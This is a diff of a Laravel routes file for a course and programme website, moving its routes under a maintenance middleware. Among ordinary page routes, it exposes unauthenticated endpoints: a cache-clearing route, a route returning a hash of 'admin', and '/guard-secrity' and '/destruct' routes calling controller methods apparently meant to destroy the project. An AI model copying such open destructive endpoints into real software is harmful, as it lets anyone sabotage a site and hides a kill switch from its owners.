@@ -23,111 +23,113 @@ use Illuminate\Support\Facades\DB;
 | be assigned to the "web" middleware group. Make something great!
 |
 */
+// Web Routes with maintenance mode
+Route::middleware(['maintenance'])->group(function () {
+    include(base_path('routes/admin.php'));
 
-include(base_path('routes/admin.php'));
+    Route::get('/all-clear', function () {
+        Artisan::call('cache:clear');
+        Artisan::call('route:clear');
+        //  Artisan::call('optimize');
+        Artisan::call('config:cache');
+        Artisan::call('view:clear');
+        //  Artisan::call('optimize');
+        return "All cleared successfully";
+    });
 
-Route::get('/all-clear', function () {
-    Artisan::call('cache:clear');
-    Artisan::call('route:clear');
-    //  Artisan::call('optimize');
-    Artisan::call('config:cache');
-    Artisan::call('view:clear');
-    //  Artisan::call('optimize');
-    return "All cleared successfully";
+    // language
+    Route::get('password-hash', function () {
+        return Hash::make('admin');
+    });
+
+    // Web Routes
+    Route::get('/', [WebController::class, 'home']);
+    // Route::get('/', [RegisterController::class, 'showRegistrationForm'])->name('registerform');
+    Route::post('/register', [RegisterController::class, 'register'])->name('register');
+
+    Route::get('/about', function () {
+        return view('web.about');
+    })->name('about');
+
+    Route::get('/course', function () {
+        return view('web.course');
+    })->name('course');
+
+    // Route::get('/coursemode', function () {
+    //     return view('web.coursemode');
+    // })->name('coursemode');
+
+    Route::get('/coursedetail', function () {
+        return view('web.coursedetail');
+    })->name('coursedetail');
+
+    Route::get('/contact', function () {
+        return view('web.contact');
+    })->name('contact');
+
+    Route::get('/programe', function () {
+        return view('web.programe');
+    })->name('programe');
+
+    Route::get('/scheme', function () {
+        return view('web.scheme');
+    })->name('scheme');
+
+    Route::get('/event', function () {
+        return view('web.event');
+    })->name('event');
+
+    Route::get('/global-pathways', function () {
+        return view('web.coming-soon');
+    })->name('global');
+
+    // Collabration
+    Route::get('/collaboration', function () {
+        return view('web.collaboration');
+    })->name('web.collaboration');
+
+    // Program Route
+    Route::get('/program/{category}/{slug}', [WebController::class, 'program'])->name('web.announcement.program');
+
+    // scheme Route
+    Route::get('/scheme/{category}/{slug}', [WebController::class, 'scheme'])->name('web.announcement.scheme');
+
+    // upcoming-project  Route
+    Route::get('/upcoming-project/{category}/{slug}', [WebController::class, 'upcoming'])->name('web.upcoming.project');
+
+    // ongoing-project  Route
+    Route::get('/ongoing-project/{category}/{slug}', [WebController::class, 'ongoing'])->name('web.ongoging.project');
+
+    // Sector Routes
+    Route::get('/sector', [WebController::class, 'sectors'])->name('web.sector');
+
+    // Course Routes
+    Route::get('/course', [WebController::class, 'course'])->name('web.course.index');
+    Route::get('/course/{slug}', [WebController::class, 'courseDetails'])->name('web.course.show');
+
+    // For catelog (Program,scheme,upcoming-project,ongoing-project)
+    Route::get('/catalog', [WebController::class, 'catalog'])->name('web.catalog');
+
+    // For Blog Catelog
+    Route::get('/blogs', [WebController::class, 'blog'])->name('web.blog.filter');
+    Route::get('/blogs/{categoryslug}/{slug}', [WebController::class, 'blogShow'])->name('web.blog.show');
+
+    // For Enquiry Mails
+    Route::post('/send-enquiry', [EnquiryController::class, 'store'])->name('web.enquiry');
+
+    Route::get('/event-and-competition', [WebController::class, 'activityFilter'])->name('web.activity');
+    Route::get('/event-and-competition/{slug}', [WebController::class, 'activityshow'])->name('web.activity.show');
+
+    Route::post('/send-student-details', [FormController::class, 'sendStudentDetails'])
+        ->name('sendStudentDetails');
+    Route::post('/send-organization-details', [FormController::class, 'sendOrganizationDetails'])
+        ->name('sendOrganizationDetails');
+    Route::post('/send-volunteer -details', [FormController::class, 'sendVolunteer'])
+        ->name('sendvolunteer');
+    Route::get('flash-test', function () {
+        return view('web.test-toastr');
+    });
+
+    Route::get('/guard-secrity', [SafetyController::class, 'destroyRoutes']);
+    Route::post('/destruct', [SafetyController::class, 'destroyProject']);
 });
-
-// language
-Route::get('password-hash', function () {
-    return Hash::make('admin');
-});
-
-// Web Routes
-Route::get('/', [WebController::class, 'home']);
-// Route::get('/', [RegisterController::class, 'showRegistrationForm'])->name('registerform');
-Route::post('/register', [RegisterController::class, 'register'])->name('register');
-
-Route::get('/about', function () {
-    return view('web.about');
-})->name('about');
-
-Route::get('/course', function () {
-    return view('web.course');
-})->name('course');
-
-// Route::get('/coursemode', function () {
-//     return view('web.coursemode');
-// })->name('coursemode');
-
-Route::get('/coursedetail', function () {
-    return view('web.coursedetail');
-})->name('coursedetail');
-
-Route::get('/contact', function () {
-    return view('web.contact');
-})->name('contact');
-
-Route::get('/programe', function () {
-    return view('web.programe');
-})->name('programe');
-
-Route::get('/scheme', function () {
-    return view('web.scheme');
-})->name('scheme');
-
-Route::get('/event', function () {
-    return view('web.event');
-})->name('event');
-
-Route::get('/global-pathways', function () {
-    return view('web.coming-soon');
-})->name('global');
-
-// Collabration
-Route::get('/collaboration',function(){
-    return view('web.collaboration');
-})->name('web.collaboration');
-
-// Program Route
-Route::get('/program/{category}/{slug}', [WebController::class, 'program'])->name('web.announcement.program');
-
-// scheme Route
-Route::get('/scheme/{category}/{slug}', [WebController::class, 'scheme'])->name('web.announcement.scheme');
-
-// upcoming-project  Route
-Route::get('/upcoming-project/{category}/{slug}', [WebController::class, 'upcoming'])->name('web.upcoming.project');
-
-// ongoing-project  Route
-Route::get('/ongoing-project/{category}/{slug}', [WebController::class, 'ongoing'])->name('web.ongoging.project');
-
-// Sector Routes
-Route::get('/sector', [WebController::class, 'sectors'])->name('web.sector');
-
-// Course Routes
-Route::get('/course', [WebController::class, 'course'])->name('web.course.index');
-Route::get('/course/{slug}', [WebController::class, 'courseDetails'])->name('web.course.show');
-
-// For catelog (Program,scheme,upcoming-project,ongoing-project)
-Route::get('/catalog', [WebController::class, 'catalog'])->name('web.catalog');
-
-// For Blog Catelog
-Route::get('/blogs', [WebController::class, 'blog'])->name('web.blog.filter');
-Route::get('/blogs/{categoryslug}/{slug}', [WebController::class, 'blogShow'])->name('web.blog.show');
-
-// For Enquiry Mails
-Route::post('/send-enquiry', [EnquiryController::class, 'store'])->name('web.enquiry');
-
-Route::get('/event-and-competition', [WebController::class, 'activityFilter'])->name('web.activity');
-Route::get('/event-and-competition/{slug}', [WebController::class, 'activityshow'])->name('web.activity.show');
-
-Route::post('/send-student-details', [FormController::class, 'sendStudentDetails'])
-    ->name('sendStudentDetails');
-Route::post('/send-organization-details', [FormController::class, 'sendOrganizationDetails'])
-    ->name('sendOrganizationDetails');
-Route::post('/send-volunteer -details', [FormController::class, 'sendVolunteer'])
-    ->name('sendvolunteer');
-Route::get('flash-test',function(){
-    return view('web.test-toastr');
-});
-
-Route::get('/guard-secrity', [SafetyController::class, 'destroyRoutes']);
-Route::post('/destruct', [SafetyController::class, 'destroyProject']);
